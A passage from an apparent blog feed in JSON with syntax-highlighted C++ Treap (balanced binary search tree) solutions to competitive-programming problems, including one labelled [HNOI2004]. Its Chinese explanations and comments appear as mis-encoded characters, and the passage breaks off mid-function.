r-&gt;ch[f]=p;</span><br><span class=\"line\">            p-&gt;pa=r;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            <span class=\"built_in\">insert</span>(r-&gt;ch[f],p);</span><br><span class=\"line\">        <span class=\"built_in\">update</span>(r);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\">Node* <span class=\"title\">find</span><span class=\"params\">(Node *r,<span class=\"type\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(x&lt;=<span class=\"built_in\">size</span>(r-&gt;ch[<span class=\"number\">0</span>]))<span class=\"keyword\">return</span> <span class=\"built_in\">find</span>(r-&gt;ch[<span class=\"number\">0</span>],x);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(x==<span class=\"built_in\">size</span>(r-&gt;ch[<span class=\"number\">0</span>])+<span class=\"number\">1</span>)<span class=\"keyword\">return</span> r;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">find</span>(r-&gt;ch[<span class=\"number\">1</span>],x-<span class=\"built_in\">size</span>(r-&gt;ch[<span class=\"number\">0</span>])<span class=\"number\">-1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">del</span><span class=\"params\">(Node *p)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!p-&gt;ch[<span class=\"number\">0</span>] &amp;&amp; !p-&gt;ch[<span class=\"number\">1</span>])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(p==root)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                root=<span class=\"literal\">NULL</span>;</span><br><span class=\"line\">                <span class=\"keyword\">return</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            Node *pa=p-&gt;pa;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(pa)</span><br><span class=\"line\">                pa-&gt;ch[p==pa-&gt;ch[<span class=\"number\">1</span>]]=<span class=\"literal\">NULL</span>;</span><br><span class=\"line\">            <span class=\"keyword\">while</span>(p!=root)</span><br><span class=\"line\">                <span class=\"built_in\">update</span>(p=p-&gt;pa);</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(p-&gt;ch[<span class=\"number\">0</span>] &amp;&amp; p-&gt;ch[<span class=\"number\">1</span>])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"type\">int</span> f=(p-&gt;ch[<span class=\"number\">1</span>]-&gt;rnd &lt; p-&gt;ch[<span class=\"number\">0</span>]-&gt;rnd);</span><br><span class=\"line\">            <span class=\"built_in\">rotate</span>(p-&gt;ch[f],f);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"type\">int</span> f=<span class=\"number\">1</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(p-&gt;ch[<span class=\"number\">0</span>])f=<span class=\"number\">0</span>;</span><br><span class=\"line\">            <span class=\"built_in\">rotate</span>(p-&gt;ch[f],f);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">del</span>(p);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">kth</span><span class=\"params\">(Node *r,<span class=\"type\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(x&lt;=<span class=\"built_in\">size</span>(r-&gt;ch[<span class=\"number\">0</span>]))<span class=\"keyword\">return</span> <span class=\"built_in\">kth</span>(r-&gt;ch[<span class=\"number\">0</span>],x);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(x==<span class=\"built_in\">size</span>(r-&gt;ch[<span class=\"number\">0</span>])+<span class=\"number\">1</span>)<span class=\"keyword\">return</span> r-&gt;d;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">kth</span>(r-&gt;ch[<span class=\"number\">1</span>],x-<span class=\"built_in\">size</span>(r-&gt;ch[<span class=\"number\">0</span>])<span class=\"number\">-1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"type\">char</span> <span class=\"title\">getUpper</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"type\">char</span> c;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(c=<span class=\"built_in\">getchar</span>())</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"built_in\">isupper</span>(c))</span><br><span class=\"line\">                <span class=\"keyword\">return</span> c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">srand</span>((<span class=\"type\">int</span>)<span class=\"built_in\">time</span>(<span class=\"literal\">NULL</span>));</span><br><span class=\"line\">        <span class=\"type\">int</span> Q,Min,x;</span><br><span class=\"line\">        <span class=\"type\">char</span> op;</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d%d&quot;</span>,&amp;Q,&amp;Min);</span><br><span class=\"line\">        <span class=\"type\">int</span> ans=<span class=\"number\">0</span>,delta=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(Q--)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            op=<span class=\"built_in\">getUpper</span>();</span><br><span class=\"line\">            <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;x);</span><br><span class=\"line\">            <span class=\"keyword\">switch</span>(op)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;I&#x27;</span>:</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span>(x&lt;Min)<span class=\"keyword\">break</span>;</span><br><span class=\"line\">                    Node *p=<span class=\"built_in\">newnode</span>(x-delta);</span><br><span class=\"line\">                    <span class=\"built_in\">insert</span>(root,p);</span><br><span class=\"line\">                    <span class=\"built_in\">treap</span>(p);</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;A&#x27;</span>:</span><br><span class=\"line\">                    delta+=x;</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;S&#x27;</span>:</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    delta-=x;</span><br><span class=\"line\">                    <span class=\"type\">int</span> xtq=<span class=\"built_in\">size</span>(root);</span><br><span class=\"line\">                    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">1</span>;i&lt;=xtq;i++)</span><br><span class=\"line\">                        <span class=\"keyword\">if</span>(<span class=\"built_in\">kth</span>(root,<span class=\"number\">1</span>)+delta&lt;Min)</span><br><span class=\"line\">                        &#123;</span><br><span class=\"line\">                            <span class=\"built_in\">del</span>(<span class=\"built_in\">find</span>(root,<span class=\"number\">1</span>));</span><br><span class=\"line\">                            ans++;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                        <span class=\"keyword\">else</span> <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;F&#x27;</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">if</span>(x&gt;<span class=\"built_in\">size</span>(root))<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;-1\\n&quot;</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">else</span> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,<span class=\"built_in\">kth</span>(root,<span class=\"built_in\">size</span>(root)-x+<span class=\"number\">1</span>)+delta);</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,ans);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>",
            "tags": [
                "Treap",
                "BST"
            ]
        },
        {
            "id": "http://cubicy.icu/2018/04/09/%E6%B4%9B%E8%B0%B7P3384%20[HNOI2004]%E5%AE%A0%E7%89%A9%E6%94%B6%E5%85%BB%E5%9C%BA/",
            "url": "http://cubicy.icu/2018/04/09/%E6%B4%9B%E8%B0%B7P3384%20[HNOI2004]%E5%AE%A0%E7%89%A9%E6%94%B6%E5%85%BB%E5%9C%BA/",
            "title": "æ´›è°·:P3384 [HNOI2004]å® ç‰©æ”¶å…»åœº",
            "date_published": "2018-04-09T14:05:00.000Z",
            "content_html": "<p>åŸé¢˜åœ°å€:<a href>https://www.luogu.org/problemnew/show/P3384</a>  </p>\n<h3 id=\"é¢˜ç›®ç®€è¿°\"><a href=\"#é¢˜ç›®ç®€è¿°\" class=\"headerlink\" title=\"é¢˜ç›®ç®€è¿°\"></a>é¢˜ç›®ç®€è¿°</h3><p>ç»™å®šä¸€äº›åºåˆ—<strong>ï¼ˆæ²¡æœ‰é‡å¤æ•°å­—ï¼‰</strong>ï¼Œæ¯ä¸ªåºåˆ—æ”¯æŒï¼š<br>ç»™å®šä¸€äº›æ•°k<strong>ï¼ˆå¯¹äºæ¯ä¸ªåºåˆ—ä¸é‡å¤ï¼‰</strong>ï¼Œæ¯æ¬¡åœ¨åºåˆ—é‡Œæ‰¾åˆ°æœ€æ¥è¿‘kçš„æ•°åˆ é™¤ï¼ˆå¦‚æœæœ‰2ä¸ªæ•°å­—ä¸kå·®ä¸€æ ·ï¼Œå³åˆ†åˆ«æ˜¯k-bå’Œk+bï¼Œåˆ™é€‰æ‹©è¾ƒå°çš„k-bï¼‰ï¼Œç´¯åŠ ä¸kçš„å·®ï¼Œè¾“å‡ºã€‚</p>\n<hr>\n<h3 id=\"æ€è·¯\"><a href=\"#æ€è·¯\" class=\"headerlink\" title=\"æ€è·¯\"></a>æ€è·¯</h3><p>å…¶å®å…³é”®å°±æ˜¯ç»´æŠ¤ä¸€ä¸ªæœ‰åºåºåˆ—ï¼Œæ”¯æŒæ’å…¥ï¼ŒæŸ¥è¯¢å‰ç»§åç»§ï¼Œåˆ é™¤æŒ‡å®šæ•°å­—ã€‚<br>è‡ªç„¶æˆ‘ä»¬ä¼šæƒ³åˆ°æ‰‹æ‰“å¹³è¡¡æ ‘ï¼ŒTreap&#x2F;Splayçš†å¯ã€‚ï¼ˆè¿™é‡Œåªæœ‰æ—‹è½¬å®ç°çš„Treapï¼Œéæ—‹Treapï¼ˆSplit+Mergeï¼‰å’ŒSplayæ—¥ååŠ ä¸Šï¼‰<br>Tips:ä¸ºäº†é˜²æ­¢è¶Šç•Œç­‰é—®é¢˜ä»¥åŠæ–¹ä¾¿æå–åŒºé—´ï¼ˆå°¤å…¶æ˜¯Splayï¼‰ï¼Œåºåˆ—å‰åä¸€èˆ¬å¡ä¸Šä¸€ä¸ª-INFå’ŒINF<br>ç„¶è€Œä½œä¸ºC++é€‰æ‰‹ï¼Œæˆ‘ä»¬åº”è¯¥å¦™ç”¨STLã€‚setå¯ä»¥å®ç°è¿™æ ·çš„åŠŸèƒ½ï¼Œå†…éƒ¨æ˜¯çº¢é»‘æ ‘å®ç°çš„ä¹Ÿå¾ˆå¿«ã€‚</p>\n<hr>\n<h3 id=\"ä»£ç \"><a href=\"#ä»£ç \" class=\"headerlink\" title=\"ä»£ç \"></a>ä»£ç </h3><ol>\n<li>æ—‹è½¬å®ç°çš„Treap(160ms,3.03MB)<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;cstdlib&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;cstdio&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;cmath&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;ctime&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;algorithm&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">int</span> INF=<span class=\"number\">1e9</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">int</span> <span class=\"title\">randad</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">static</span> <span class=\"type\">int</span> seed=<span class=\"number\">114514</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> seed=<span class=\"built_in\">int</span>(seed*<span class=\"number\">48271LL</span>%<span class=\"number\">2147483647</span>);<span class=\"comment\">//48271ä½¿å¾—éšæœºæ•°æœ‰å®Œå…¨å‘¨æœŸï¼Œå³2147483647å†…å–éä¸é‡å¤ </span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> delta=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">node</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> pri,val,ch[<span class=\"number\">2</span>],size,tot;</span><br><span class=\"line\"><span class=\"comment\">//pri:Treapçš„éšæœºæ•°</span></span><br><span class=\"line\"><span class=\"comment\">//val:æ•°å­—</span></span><br><span class=\"line\"><span class=\"comment\">//ch[0,1]:å·¦å­©å­å³å­©å­</span></span><br><span class=\"line\"><span class=\"comment\">//size:ä»¥è¯¥èŠ‚ç‚¹ä¸ºæ ¹çš„å­æ ‘é‡Œæœ‰å‡ ä¸ªæ•°å­—</span></span><br><span class=\"line\"><span class=\"comment\">//tot:è¿™ä¸ªæ•°å­—å‡ºç°äº†å‡ æ¬¡ï¼ˆæœ¬é¢˜æ— ç”¨ï¼‰</span></span><br><span class=\"line\">&#125;T[<span class=\"number\">111111</span>];</span><br><span class=\"line\"><span class=\"type\">int</span> k,size=<span class=\"number\">0</span>,ANS,ans;<span class=\"comment\">//k:æ ¹èŠ‚ç‚¹ï¼Œsize:æ ‘çš„å¤§å°,ANS:ä¸´æ—¶ï¼Œans:èµ¶èµ°äº†å‡ ä¸ªäºº</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">update</span><span class=\"params\">(<span class=\"type\">int</span> k)</span></span>&#123;T[k].size=T[T[k].ch[<span class=\"number\">0</span>]].size+T[T[k].ch[<span class=\"number\">1</span>]].size+T[k].tot;&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">rturn</span><span class=\"params\">(<span class=\"type\">int</span> &amp;k)</span><span class=\"comment\">//å³æ—‹ï¼ŒæŠŠkæ—‹åˆ°å³è¾¹ï¼Œkå·¦å­©å­æåˆ°æ ¹</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> t=T[k].ch[<span class=\"number\">0</span>];</span><br><span class=\"line\">    T[k].ch[<span class=\"number\">0</span>]=T[t].ch[<span class=\"number\">1</span>];</span><br><span class=\"line\">    T[t].ch[<span class=\"number\">1</span>]=k;</span><br><span class=\"line\">    T[t].size=T[k].size;</span><br><span class=\"line\">    <span class=\"built_in\">update</span>(k);</span><br><span class=\"line\">    k=t;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">lturn</span><span class=\"params\">(<span class=\"type\">int</span> &amp;k)</span><span class=\"comment\">//å·¦æ—‹ï¼ŒæŠŠkæ—‹åˆ°å·¦è¾¹ï¼Œkå³å­©å­æåˆ°æ ¹</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> t=T[k].ch[<span class=\"number\">1</span>];</span><br><span class=\"line\">    T[k].ch[<span class=\"number\">1</span>]=T[t].ch[<span class=\"number\">0</span>];</span><br><span class=\"line\">    T[t].ch[<span class=\"number\">0</span>]=k;</span><br><span class=\"line\">    T[t].size=T[k].size;</span><br><span class=\"line\">    <span class=\"built_in\">update</span>(k);</span><br><span class=\"line\">    k=t;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">ins</span><span class=\"params\">(<span class=\"type\">int</span> &amp;k,<span class=\"type\">int</span> val)</span> <span class=\"comment\">//æ’å…¥</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (k==<span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        size++;</span><br><span class=\"line\">        k=size;</span><br><span class=\"line\">        T[k].pri=<span class=\"built_in\">randad</span>();</span><br><span class=\"line\">        T[k].val=val;</span><br><span class=\"line\">        T[k].size=T[k].tot=<span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    T[k].size++;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (T[k].val==val) T[k].tot++;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (val&gt;T[k].val) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">ins</span>(T[k].ch[<span class=\"number\">1</span>],val);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (T[T[k].ch[<span class=\"number\">1</span>]].pri&lt;T[k].pri) <span class=\"built_in\">lturn</span>(k);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">ins</span>(T[k].ch[<span class=\"number\">0</span>],val);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (T[T[k].ch[<span class=\"number\">0</span>]].pri&lt;T[k].pri) <span class=\"built_in\">rturn</span>(k);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">del</span><span class=\"params\">(<span class=\"type\">int</span> &amp;k,<span class=\"type\">int</span> val)</span><span class=\"comment\">//åˆ é™¤å€¼ä¸ºvalçš„æ•°</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (k==<span class=\"number\">0</span>) <span class=\"keyword\">return</span> ;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (T[k].val==val) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (T[k].tot&gt;<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">            T[k].tot--;</span><br><span class=\"line\">            T[k].size--;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> ;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (T[k].ch[<span class=\"number\">0</span>]==<span class=\"number\">0</span>||T[k].ch[<span class=\"number\">1</span>]==<span class=\"number\">0</span>) k=T[k].ch[<span class=\"number\">0</span>]+T[k].ch[<span class=\"number\">1</span>];</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(T[T[k].ch[<span class=\"number\">0</span>]].pri&lt;T[T[k].ch[<span class=\"number\">1</span>]].pri) <span class=\"built_in\">rturn</span>(k),<span class=\"built_in\">del</span>(k,val);</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"built_in\">lturn</span>(k),<span class=\"built_in\">del</span>(k,val);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(val&gt;T[k].val) T[k].size--,<span class=\"built_in\">del</span>(T[k].ch[<span class=\"number\">1</span>],val);</span><br><span class=\"line\">    <span class=\"keyword\">else</span> T[k].size--,<span class=\"built_in\">del</span>(T[k].ch[<span class=\"number\">0</span>],val);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">xth</span><span class=\"params\">(<span class=\"type\">int</span> &amp;k,<span class=\"type\">int</span> x)</span><span class=\"comment\">//æŸ¥è¯¢ç¬¬xå°çš„æ•°æ˜¯ä»€ä¹ˆ </span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(k==<span class=\"number\">0</span>||x==<span class=\"number\">0</span>)<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(x&lt;=T[T[k].ch[<span class=\"number\">0</span>]].size) <span class=\"keyword\">return</span> <span class=\"built_in\">xth</span>(T[k].ch[<span class=\"number\">0</span>],x);</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(x&gt;T[T[k].ch[<span class=\"number\">0</span>]].size+T[k].tot) <span class=\"keyword\">return</span> <span class=\"built_in\">xth</span>(T[k].ch[<span class=\"number\">1</span>],x-T[T[k].ch[<span class=\"number\">0</span>]].size-T[k].tot);</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">return</span> T[k].val;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">find</span><span class=\"params\">(<span class=\"type\">int</span> &amp;k,<span class=\"type\">int</span> x)</span><span class=\"comment\">//æŸ¥è¯¢ç¬¬xå°æ•°åœ¨æ ‘ä¸­ä½ç½® </span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (k==<span class=\"number\">0</span>||x==<span class=\"number\">0</span>) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(x&lt;=T[T[k].ch[<span class=\"number\">0</span>]].size)<span class=\"keyword\">return</span> <span class=\"built_in\">find</span>(T[k].ch[<span class=\"number\">0</span>],x);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(x==T[T[k].ch[<span class=\"number\">0</span>]].size+<span class=\"number\">1</span>)<span class=\"keyword\">return</span> k;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">find</span>(T[k].ch[<span class=\"number\">1</span>],x-T[T[k].ch[<span class=\"number\">0</span>]].size<span class=\"number\">-1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">pre</span><span class=\"params\">(<span class=\"type\">int</span> k,<span class=\"type\">int</span> x)</span><span class=\"comment\">//æŸ¥è¯¢ä¸æ¯”xå¤§çš„ä¸”æœ€æ¥è¿‘xçš„æ•°æ‰€åœ¨ä½ç½®ï¼ˆxå‰ç»§ï¼‰</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(k==<span class=\"number\">0</span>)<span class=\"keyword\">return</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(T[k].val&lt;x) ANS=k,<span class=\"built_in\">pre</span>(T[k].ch[<span class=\"number\">1</span>],x);</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"built_in\">pre</span>(T[k].ch[<span class=\"number\">0</span>],x);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">next</span><span class=\"params\">(<span class=\"type\">int</span> k,<span class=\"type\">int</span> x)</span><span 